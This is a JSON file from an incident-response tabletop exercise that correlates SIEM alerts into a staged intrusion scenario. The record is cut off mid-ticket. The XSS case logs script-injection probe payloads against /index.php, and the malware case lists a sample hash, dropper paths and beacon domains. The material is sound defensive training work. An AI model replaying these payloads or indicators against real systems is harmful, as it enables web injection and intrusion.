@@ -1,0 +1,4340 @@
+{
+  "generated_at_utc": "2026-11-26T02:47:58+00:00",
+  "generator": "Week-4/IR/correlate.py",
+  "scenario": {
+    "scenario_id": "W4-TT-01",
+    "title": "Composite multi-stage intrusion - tabletop simulation",
+    "simulation_type": "composite_tabletop",
+    "framework": "NIST SP 800-61 Rev.2 incident handling lifecycle / SANS PICERL",
+    "boundary_statement": [
+      "Every stage is represented by real, hash-verifiable evidence that already exists in Week-2 (datasets, OpenObserve alert evidence, verified timelines) and Week-3 (tickets, audit logs).",
+      "The datasets come from different public sources and different years. The chain that links the stages is a scenario construct for the tabletop exercise; causal links between stages are NOT observed in the data.",
+      "Timeline order is the scenario stage order. Timestamps shown are the original dataset timestamps and are never shifted or invented.",
+      "No live SIEM, no live TheHive, no live threat-intelligence feed, no remediation is executed. Containment/eradication/recovery items are proposals that require a recorded analyst decision."
+    ],
+    "stages": [
+      {
+        "stage_id": "S1",
+        "order": 1,
+        "name": "Reconnaissance",
+        "kill_chain": "Reconnaissance / Discovery",
+        "domain": "network",
+        "case_ids": [
+          "NT-01"
+        ],
+        "question_for_analysts": "Is the vertical port scan from an authorised scanner, and which hosts/services were exposed?"
+      },
+      {
+        "stage_id": "S2",
+        "order": 2,
+        "name": "Web-tier attack",
+        "kill_chain": "Initial Access attempt",
+        "domain": "web",
+        "case_ids": [
+          "SIEM-WEB-001",
+          "SIEM-WEB-004"
+        ],
+        "question_for_analysts": "Did any XSS payload execute in a browser, and is the high-rate HTTP source linked to the scan?"
+      },
+      {
+        "stage_id": "S3",
+        "order": 3,
+        "name": "Credential attack",
+        "kill_chain": "Credential Access",
+        "domain": "auth",
+        "case_ids": [
+          "SIEM-AUTH-002",
+          "LT-01"
+        ],
+        "question_for_analysts": "Did any SSH password guess succeed (Accepted password) for root or another account?"
+      },
+      {
+        "stage_id": "S4",
+        "order": 4,
+        "name": "Execution",
+        "kill_chain": "Execution",
+        "domain": "endpoint",
+        "case_ids": [
+          "SIEM-MAL-003",
+          "LT-03"
+        ],
+        "question_for_analysts": "Is the dropped executable malicious (hash verdict), and did the reverse-shell connection succeed?"
+      },
+      {
+        "stage_id": "S5",
+        "order": 5,
+        "name": "Persistence and privilege-sensitive activity",
+        "kill_chain": "Persistence / Privilege Escalation",
+        "domain": "endpoint",
+        "case_ids": [
+          "RT-04",
+          "LT-02"
+        ],
+        "question_for_analysts": "Is the Winlogon Shell modification authorised, and were the sudo commands approved administration?"
+      },
+      {
+        "stage_id": "S6",
+        "order": 6,
+        "name": "Discovery and defense evasion",
+        "kill_chain": "Discovery / Defense Evasion",
+        "domain": "endpoint",
+        "case_ids": [
+          "RT-02"
+        ],
+        "question_for_analysts": "Who cleared the Security log (Event 1102) and was it part of approved maintenance?"
+      },
+      {
+        "stage_id": "S7",
+        "order": 7,
+        "name": "Lateral movement",
+        "kill_chain": "Lateral Movement",
+        "domain": "endpoint",
+        "case_ids": [
+          "RT-03"
+        ],
+        "question_for_analysts": "Which client and account initiated the WinRM command execution on the domain controller?"
+      },
+      {
+        "stage_id": "S8",
+        "order": 8,
+        "name": "Command and control",
+        "kill_chain": "Command and Control",
+        "domain": "network",
+        "case_ids": [
+          "NT-03",
+          "NT-02",
+          "RT-01"
+        ],
+        "question_for_analysts": "Are the periodic connections, DNS chunk burst and plink tunnel C2 channels or approved tooling?"
+      },
+      {
+        "stage_id": "S9",
+        "order": 9,
+        "name": "Collection / exfiltration (hypothesis)",
+        "kill_chain": "Collection / Exfiltration",
+        "domain": "email",
+        "case_ids": [
+          "SIEM-EXCH-005"
+        ],
+        "question_for_analysts": "Did the mailbox export requests complete, and do the exported .aspx files exist on the server?"
+      }
+    ],
+    "false_positive_controls": {
+      "description": "Benign-candidate cases kept in the exercise to show the triage separates routine activity from the attack chain.",
+      "case_ids": [
+        "BT-01",
+        "BT-02",
+        "BT-03",
+        "LT-04"
+      ]
+    }
+  },
+  "cases": [
+    {
+      "case_id": "SIEM-WEB-001",
+      "title": "High-rate HTTP requests from a single source",
+      "domain": "web",
+      "source_kind": "siem_alert",
+      "detection_rule": "SIEM_WEB_001_HIGH_RATE_HTTP_REQUESTS",
+      "playbook": "PB-03",
+      "dataset": "depi_web_access",
+      "evidence_files": [
+        {
+          "path": "Week-2/Evidence/SIEM-OpenObserve/SIEM05_Auto_Alert_AI_Triage_469dc3deb13af6394b.json",
+          "sha256": "b264f37f246d18a5c3e4263d4ff39f78290879ac45efe1051ffa538f7fcbb9de"
+        },
+        {
+          "path": "Week-2/Evidence/SIEM-OpenObserve/SIEM05_Controlled_AI_Reanalysis_20261023.json",
+          "sha256": "4a6258e99277b52e9bdaa7bcffe60520d1e19c4bcb6a0370b0ae68dcdc37aca2"
+        }
+      ],
+      "facts": {
+        "source_ip": "255.102.154.224",
+        "request_count": 112,
+        "threshold": 80,
+        "minute_utc": "2025-10-07T02:14Z",
+        "top_path": "/3.php",
+        "request_uri": "/3.php, /1.php, /40.php (top paths)"
+      },
+      "events": [
+        {
+          "ts_original": "2025-10-07T02:14Z",
+          "ts_quality": "original_utc_minute",
+          "summary": "112 HTTP requests from 255.102.154.224 in one minute (threshold 80); GET 200 x88, POST 200 x14, GET 302 x10",
+          "ref": "W001",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM05_Auto_Alert_AI_Triage_469dc3deb13af6394b.json"
+        }
+      ],
+      "event_count_total": 112,
+      "ai": {
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "severity": "Medium",
+        "confidence": "Moderate",
+        "summary": "High rate of HTTP requests from an internal IP address",
+        "qa_status": "REVIEW_REQUIRED",
+        "human_validation_required": true,
+        "semantic_warnings": [],
+        "generated_at_utc": "2026-10-22T23:41:57.927212+00:00",
+        "trigger_fired_utc": "2026-10-22T23:41:26.577619+00:00",
+        "trigger_to_ai_triage_seconds": 31.3,
+        "trigger_key": "SIEM_WEB_001_HIGH_RATE_HTTP_REQUESTS/3L1hr8G47RwjmCKb4MwmUa6SzEs",
+        "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM05_Auto_Alert_AI_Triage_469dc3deb13af6394b.json"
+      },
+      "human_review": {
+        "status": "PENDING (Week-2 REVIEW_REQUIRED; Week-3 tickets Pending Review)",
+        "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM05_Auto_Alert_AI_Triage_469dc3deb13af6394b.json"
+      },
+      "tickets": [
+        {
+          "ticket_id": "469dc3deb13af6394b4f692624bbe87e13c05780836efb320aebabe885b0fc9a",
+          "playbook_id": "PB-03",
+          "tier": "Tier 1",
+          "qa_status": "REVIEW_REQUIRED",
+          "review_status": "Pending Review",
+          "analyst_decision": null,
+          "proposed_actions": [
+            "propose_waf_rule_review"
+          ],
+          "proposed_detail": [
+            {
+              "action": "propose_waf_rule_review",
+              "requires": "analyst_approval",
+              "template": "Propose WAF rule review for {request_uri} (NOT executed)",
+              "rationale": "Week-2 XSS report §8; HTTP correlation gap means no source-block proposal"
+            }
+          ],
+          "prohibited_actions": [
+            "execute_rate_limit",
+            "execute_isolation",
+            "disable_account"
+          ],
+          "prohibited_detail": [
+            {
+              "action": "execute_rate_limit",
+              "reason": "HTTP correlation gap (Week-2 acceptance gate 2) — cannot block source safely"
+            },
+            {
+              "action": "execute_isolation",
+              "reason": "Tier 2 prohibited"
+            },
+            {
+              "action": "disable_account",
+              "reason": "Week-2 reports prohibit automatic account action"
+            }
+          ],
+          "auto_actions": [
+            "parse",
+            "enrich(stub)",
+            "create_ticket",
+            "notify",
+            "audit"
+          ],
+          "audit_lines": 2,
+          "file": "Week-3/SOAR/tickets/469dc3deb13af6394b4f692624bbe87e13c05780836efb320aebabe885b0fc9a.json",
+          "audit_file": "Week-3/SOAR/audit/469dc3deb13af6394b4f692624bbe87e13c05780836efb320aebabe885b0fc9a.jsonl"
+        }
+      ],
+      "benign_control": false,
+      "limitations": [
+        "Source IP is in reserved address space (source_ip_quality.is_reserved=true).",
+        "A firing trigger is checked within a recent interval but lacks a proven row-level ID join.",
+        "AI findings require human verification.",
+        "Replay dataset is not live production traffic."
+      ],
+      "attack": [
+        {
+          "technique": "T1595",
+          "name": "Active Scanning",
+          "tactic": "Reconnaissance",
+          "confidence": "candidate",
+          "basis": "112 requests in one minute from one source against threshold 80 (SIEM05 evidence); intent not established"
+        }
+      ],
+      "stage_id": "S2"
+    },
+    {
+      "case_id": "SIEM-AUTH-002",
+      "title": "SSH brute force against root",
+      "domain": "auth",
+      "source_kind": "siem_alert",
+      "detection_rule": "SIEM_AUTH_002_SSH_BRUTE_FORCE",
+      "playbook": "PB-01",
+      "dataset": "OpenSSH_2k.log",
+      "evidence_files": [
+        {
+          "path": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json",
+          "sha256": "cb1ea5fe6e96eb4d67f57fc8727599e638dd6a507e666d4668a29a87c56137db"
+        }
+      ],
+      "facts": {
+        "source_ip": "183.62.140.253",
+        "failed_count": 30,
+        "threshold": 5,
+        "username": "root",
+        "minute": "Dec 10 11:01",
+        "dataset": "OpenSSH_2k.log"
+      },
+      "events": [
+        {
+          "ts_original": "Dec 10 11:01",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "30 failed passwords for root from 183.62.140.253 within one minute (threshold 5)",
+          "ref": "A001",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+        },
+        {
+          "ts_original": "Dec 10 11:01:01",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "Failed password for root from 183.62.140.253 port 51395 (source line 1621)",
+          "ref": "A002",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+        },
+        {
+          "ts_original": "Dec 10 11:01:02",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "Failed password for root from 183.62.140.253 port 51830 (source line 1624)",
+          "ref": "A003",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+        },
+        {
+          "ts_original": "Dec 10 11:01:04",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "Failed password for root from 183.62.140.253 port 52182 (source line 1627)",
+          "ref": "A004",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+        },
+        {
+          "ts_original": "Dec 10 11:01:06",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "Failed password for root from 183.62.140.253 port 52545 (source line 1630)",
+          "ref": "A005",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+        },
+        {
+          "ts_original": "Dec 10 11:01:08",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "Failed password for root from 183.62.140.253 port 52850 (source line 1633)",
+          "ref": "A006",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+        },
+        {
+          "ts_original": "Dec 10 11:01:10",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "Failed password for root from 183.62.140.253 port 53160 (source line 1636)",
+          "ref": "A007",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+        },
+        {
+          "ts_original": "Dec 10 11:01:13",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "Failed password for root from 183.62.140.253 port 53630 (source line 1639)",
+          "ref": "A008",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+        },
+        {
+          "ts_original": "Dec 10 11:01:14",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "Failed password for root from 183.62.140.253 port 54049 (source line 1642)",
+          "ref": "A009",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+        }
+      ],
+      "event_count_total": 30,
+      "ai": {
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "severity": "Medium",
+        "confidence": "High",
+        "summary": "Potential SSH brute-force attack detected on IP address 183.62.140.253 targeting the 'root' user account.",
+        "qa_status": "SCHEMA_PASS_HUMAN_REVIEW_REQUIRED",
+        "human_validation_required": true,
+        "semantic_warnings": [],
+        "generated_at_utc": "2026-10-26T23:47:13.848833+00:00",
+        "trigger_fired_utc": "2026-10-26T23:46:45.206396+00:00",
+        "trigger_to_ai_triage_seconds": 28.6,
+        "trigger_key": "SIEM_AUTH_002_SSH_BRUTE_FORCE/3LFgj2r7wLsZnMKzmAGq58E9FKj",
+        "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+      },
+      "human_review": {
+        "status": "PENDING (Week-2 REVIEW_REQUIRED; Week-3 tickets Pending Review)",
+        "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json"
+      },
+      "tickets": [
+        {
+          "ticket_id": "a823d14b61f061f7954e2e3eb7f18d6af6280f53242fe8c711d5cd78bcefdbae",
+          "playbook_id": "PB-01",
+          "tier": "Tier 1",
+          "qa_status": "SCHEMA_PASS_HUMAN_REVIEW_REQUIRED",
+          "review_status": "Pending Review",
+          "analyst_decision": null,
+          "proposed_actions": [
+            "rate_limit_source_ip"
+          ],
+          "proposed_detail": [
+            {
+              "action": "rate_limit_source_ip",
+              "requires": "analyst_approval",
+              "template": "Propose 1h edge rate-limit for 183.62.140.253 (NOT executed)",
+              "rationale": "Week-2 SSH report §4 model recommended rate-limiting; §5 says success unconfirmed, so propose not execute"
+            }
+          ],
+          "prohibited_actions": [
+            "lock_account",
+            "execute_rate_limit",
+            "isolate_host"
+          ],
+          "prohibited_detail": [
+            {
+              "action": "lock_account",
+              "reason": "Successful login not established (Week-2 SSH report §5)"
+            },
+            {
+              "action": "execute_rate_limit",
+              "reason": "Tier 2 prohibited; requires recorded analyst decision"
+            },
+            {
+              "action": "isolate_host",
+              "reason": "No host evidence in this alert type"
+            }
+          ],
+          "auto_actions": [
+            "parse",
+            "enrich(stub)",
+            "create_ticket",
+            "notify",
+            "audit"
+          ],
+          "audit_lines": 3,
+          "file": "Week-3/SOAR/tickets/a823d14b61f061f7954e2e3eb7f18d6af6280f53242fe8c711d5cd78bcefdbae.json",
+          "audit_file": "Week-3/SOAR/audit/a823d14b61f061f7954e2e3eb7f18d6af6280f53242fe8c711d5cd78bcefdbae.jsonl"
+        }
+      ],
+      "benign_control": false,
+      "limitations": [
+        "Repeated failed SSH password attempts are detected; successful intrusion is not established.",
+        "Original SSH event dates have no year/timezone.",
+        "Trigger-key correlation is rule-level, not proven exact alert-row linkage.",
+        "Historic replay data, not live production traffic.",
+        "AI schema validation does not prove semantic correctness; human review is required."
+      ],
+      "attack": [
+        {
+          "technique": "T1110.001",
+          "name": "Brute Force: Password Guessing",
+          "tactic": "Credential Access",
+          "confidence": "observed_pattern",
+          "basis": "30 failed passwords for root from one source in one minute, threshold 5 (SIEM06 Auth evidence)"
+        }
+      ],
+      "stage_id": "S3"
+    },
+    {
+      "case_id": "SIEM-MAL-003",
+      "title": "Suspicious executable with DNS + outbound connection",
+      "domain": "endpoint",
+      "source_kind": "siem_alert",
+      "detection_rule": "SIEM_MAL_003_SUSPICIOUS_MALWARE_BEHAVIOR",
+      "playbook": "PB-02",
+      "dataset": "9c9aa5_campaign.evtx",
+      "evidence_files": [
+        {
+          "path": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json",
+          "sha256": "7146c223fec7c139b09da9c062e3d85ee0b8bd2e14476109d504b7e14194684d"
+        }
+      ],
+      "facts": {
+        "process_image": "C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe",
+        "parent_process": "C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP000.TMP\\N1F90.exe",
+        "sha256": "A1A79FEBE636F6AF95CA527BF37321A329F37BC2524414376F2727F4D9BD17C1",
+        "imphash": "2EABE9054CAD5152567F0699947A2C5B",
+        "destination_ip": "104.80.2.104",
+        "destination_port": 443,
+        "dns_query_count": 10,
+        "domains": [
+          "plodnittpw.lat",
+          "bloodyswif.lat",
+          "washyceehsu.lat",
+          "leggelatez.lat",
+          "miniatureyu.lat",
+          "kickykiduz.lat",
+          "savorraiykj.lat",
+          "shoefeatthe.lat",
+          "finickypwk.lat",
+          "steamcommunity.com"
+        ],
+        "dataset": "9c9aa5_campaign.evtx"
+      },
+      "events": [
+        {
+          "ts_original": "2025-06-13T00:35:40.5074673+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 1 process create C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe (parent C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP000.TMP\\N1F90.exe)",
+          "ref": "SYSMON-R2611",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:43.1123186+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 22 DNS query plodnittpw.lat",
+          "ref": "SYSMON-R2740",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:43.1123429+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 22 DNS query bloodyswif.lat",
+          "ref": "SYSMON-R2741",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:43.1123670+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 22 DNS query washyceehsu.lat",
+          "ref": "SYSMON-R2742",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:43.1123867+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 22 DNS query leggelatez.lat",
+          "ref": "SYSMON-R2743",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:43.1124162+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 22 DNS query miniatureyu.lat",
+          "ref": "SYSMON-R2744",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:43.1124353+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 22 DNS query kickykiduz.lat",
+          "ref": "SYSMON-R2745",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:43.9244415+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 3 network connection to 104.80.2.104:443",
+          "ref": "SYSMON-R2789",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:44.1278660+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 22 DNS query savorraiykj.lat",
+          "ref": "SYSMON-R2790",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:44.1278879+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 22 DNS query shoefeatthe.lat",
+          "ref": "SYSMON-R2791",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:44.1279185+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 22 DNS query finickypwk.lat",
+          "ref": "SYSMON-R2792",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        },
+        {
+          "ts_original": "2025-06-13T00:35:44.1279330+03:00",
+          "ts_quality": "original_with_offset",
+          "summary": "Sysmon 22 DNS query steamcommunity.com",
+          "ref": "SYSMON-R2793",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+        }
+      ],
+      "event_count_total": 12,
+      "ai": {
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "severity": "High",
+        "confidence": "Medium",
+        "summary": "Suspicious process creation, DNS queries, and network connection observed",
+        "qa_status": "SCHEMA_PASS_HUMAN_REVIEW_REQUIRED",
+        "human_validation_required": true,
+        "semantic_warnings": [],
+        "generated_at_utc": "2026-10-28T03:51:27.454391+00:00",
+        "trigger_fired_utc": "2026-10-28T03:50:39.365462+00:00",
+        "trigger_to_ai_triage_seconds": 48.1,
+        "trigger_key": "SIEM_MAL_003_SUSPICIOUS_MALWARE_BEHAVIOR/3LJ1m1VsUPe9KW6ZPtmCRpyyWgo",
+        "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+      },
+      "human_review": {
+        "status": "PENDING (Week-2 REVIEW_REQUIRED; Week-3 tickets Pending Review)",
+        "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json"
+      },
+      "tickets": [
+        {
+          "ticket_id": "e05ccfe875e6a53524e7270675a6720d54c7ae95ab4353e906f32f04c14f14b9",
+          "playbook_id": "PB-02",
+          "tier": "Tier 1",
+          "qa_status": "SCHEMA_PASS_HUMAN_REVIEW_REQUIRED",
+          "review_status": "Pending Review",
+          "analyst_decision": null,
+          "proposed_actions": [
+            "propose_host_isolation",
+            "propose_hash_blocklist"
+          ],
+          "proposed_detail": [
+            {
+              "action": "propose_host_isolation",
+              "requires": "analyst_approval",
+              "template": "Propose isolation of host running C:\\Users\\WDAGUtilityAccount\\AppData\\Local\\Temp\\IXP001.TMP\\2r8602.exe (NOT executed)",
+              "rationale": "Malware report §6: consider containment only after operational-impact evaluation"
+            },
+            {
+              "action": "propose_hash_blocklist",
+              "requires": "analyst_approval",
+              "template": "Propose blocklisting SHA256 A1A79FEBE636F6AF95CA527BF37321A329F37BC2524414376F2727F4D9BD17C1 (NOT executed)"
+            }
+          ],
+          "prohibited_actions": [
+            "execute_isolation",
+            "execute_rate_limit",
+            "disable_account"
+          ],
+          "prohibited_detail": [
+            {
+              "action": "execute_isolation",
+              "reason": "Tier 2 prohibited; requires recorded analyst decision"
+            },
+            {
+              "action": "execute_rate_limit",
+              "reason": "Tier 2 prohibited"
+            },
+            {
+              "action": "disable_account",
+              "reason": "Week-2 reports prohibit automatic account action"
+            }
+          ],
+          "auto_actions": [
+            "parse",
+            "enrich(stub)",
+            "create_ticket",
+            "notify",
+            "audit"
+          ],
+          "audit_lines": 3,
+          "file": "Week-3/SOAR/tickets/e05ccfe875e6a53524e7270675a6720d54c7ae95ab4353e906f32f04c14f14b9.json",
+          "audit_file": "Week-3/SOAR/audit/e05ccfe875e6a53524e7270675a6720d54c7ae95ab4353e906f32f04c14f14b9.jsonl"
+        }
+      ],
+      "benign_control": false,
+      "limitations": [
+        "Behavioral correlation indicates suspicious activity; infection is not independently confirmed.",
+        "Original Sysmon events are from historical laboratory replay; _timestamp is ingestion time.",
+        "Trigger key verifies the alert rule, not exact alert-row provenance.",
+        "Network connection and DNS queries alone do not establish C2 or exfiltration.",
+        "AI schema/semantic checks do not replace analyst validation."
+      ],
+      "attack": [
+        {
+          "technique": "T1204.002",
+          "name": "User Execution: Malicious File",
+          "tactic": "Execution",
+          "confidence": "candidate",
+          "basis": "Executable launched from IXP000.TMP/IXP001.TMP temp extraction paths (Sysmon ID 1); maliciousness not verified by hash reputation"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Application Layer Protocol: Web Protocols",
+          "tactic": "Command and Control",
+          "confidence": "candidate",
+          "basis": "10 DNS queries and one outbound connection to 104.80.2.104:443 from the same process; Week-2 states this alone does not establish C2"
+        }
+      ],
+      "stage_id": "S4"
+    },
+    {
+      "case_id": "SIEM-WEB-004",
+      "title": "Cross-site scripting (XSS) payloads",
+      "domain": "web",
+      "source_kind": "siem_alert",
+      "detection_rule": "SIEM_WEB_004_XSS_ATTACK_DETECTED",
+      "playbook": "PB-03",
+      "dataset": "depi_web_xss",
+      "evidence_files": [
+        {
+          "path": "Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_6ba5792eef667c9cf8.json",
+          "sha256": "6eaa96bfc2ec8b81d3f27471afd03b15e6935fa4f66e755b9b93f21bb16bd47c"
+        },
+        {
+          "path": "Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_843425fa737b11ef71.json",
+          "sha256": "ae56f8fbf252a894563c218b53b616f22444371b91bda6c0fbcb7e57d86e80f0"
+        },
+        {
+          "path": "Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_fad10ea2b71bb2bc09.json",
+          "sha256": "f6830ff7dda1276ff743adb22e814bec5ddf42df4f86dfd36cd7c312931b3bd6"
+        }
+      ],
+      "facts": {
+        "source_ip": "192.168.171.129",
+        "instances": 3,
+        "transaction_ids": [
+          "ZwuU-873D9JP20xgx6@OtgAAAAA",
+          "ZwuU-iAtf3OzxrG7aRST3wAAAAU",
+          "ZwuU-cU9wzVu0YTv9ijcSwAAAAI"
+        ],
+        "request_path": "/index.php",
+        "request_uri": "/index.php"
+      },
+      "events": [
+        {
+          "ts_original": "13/Oct/2024:09:38:07 +0000",
+          "ts_quality": "original_with_offset",
+          "summary": "HTTP 500 for XSS payload /index.php?p=\"`'><script>\\x7Ejavascript:alert(1)</script>&debug_url=1 from 192.168.171.129 (tx ZwuU-873D9JP20xgx6@OtgAAAAA)",
+          "ref": "ZwuU-873D9JP20xgx6@OtgAAAAA",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_6ba5792eef667c9cf8.json"
+        },
+        {
+          "ts_original": "13/Oct/2024:09:38:06 +0000",
+          "ts_quality": "original_with_offset",
+          "summary": "HTTP 500 for XSS payload /index.php?p=\"`'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>&debug_url=1 from 192.168.171.129 (tx ZwuU-iAtf3OzxrG7aRST3wAAAAU)",
+          "ref": "ZwuU-iAtf3OzxrG7aRST3wAAAAU",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_843425fa737b11ef71.json"
+        },
+        {
+          "ts_original": "13/Oct/2024:09:38:05 +0000",
+          "ts_quality": "original_with_offset",
+          "summary": "HTTP 500 for XSS payload /index.php?p=\"`'><script>\\x0Ajavascript:alert(1)</script>&debug_url=1 from 192.168.171.129 (tx ZwuU-cU9wzVu0YTv9ijcSwAAAAI)",
+          "ref": "ZwuU-cU9wzVu0YTv9ijcSwAAAAI",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_fad10ea2b71bb2bc09.json"
+        }
+      ],
+      "event_count_total": 3,
+      "ai": {
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "severity": "High",
+        "confidence": "High",
+        "summary": "Potential Cross-Site Scripting (XSS) attempt detected",
+        "qa_status": "SCHEMA_PASS_HUMAN_REVIEW_REQUIRED",
+        "human_validation_required": true,
+        "semantic_warnings": [],
+        "generated_at_utc": "2026-10-31T22:16:17.324887+00:00",
+        "trigger_fired_utc": "2026-10-31T22:15:37.199628+00:00",
+        "trigger_to_ai_triage_seconds": 40.1,
+        "trigger_key": "SIEM_WEB_004_XSS_ATTACK_DETECTED/3LQOtthRb5OozWYlTvYvH58Cmtk",
+        "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_6ba5792eef667c9cf8.json"
+      },
+      "human_review": {
+        "status": "PENDING (Week-2 REVIEW_REQUIRED; Week-3 tickets Pending Review)",
+        "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_6ba5792eef667c9cf8.json"
+      },
+      "tickets": [
+        {
+          "ticket_id": "6ba5792eef667c9cf86fe718978b3c8b2ba892dd0968e5e3d30b66aeec678956",
+          "playbook_id": "PB-03",
+          "tier": "Tier 1",
+          "qa_status": "SCHEMA_PASS_HUMAN_REVIEW_REQUIRED",
+          "review_status": "Pending Review",
+          "analyst_decision": null,
+          "proposed_actions": [
+            "propose_waf_rule_review"
+          ],
+          "proposed_detail": [
+            {
+              "action": "propose_waf_rule_review",
+              "requires": "analyst_approval",
+              "template": "Propose WAF rule review for /index.php?p=... (NOT executed)",
+              "rationale": "Week-2 XSS report §8; HTTP correlation gap means no source-block proposal"
+            }
+          ],
+          "prohibited_actions": [
+            "execute_rate_limit",
+            "execute_isolation",
+            "disable_account"
+          ],
+          "prohibited_detail": [
+            {
+              "action": "execute_rate_limit",
+              "reason": "HTTP correlation gap (Week-2 acceptance gate 2) — cannot block source safely"
+            },
+            {
+              "action": "execute_isolation",
+              "reason": "Tier 2 prohibited"
+            },
+            {
+              "action": "disable_account",
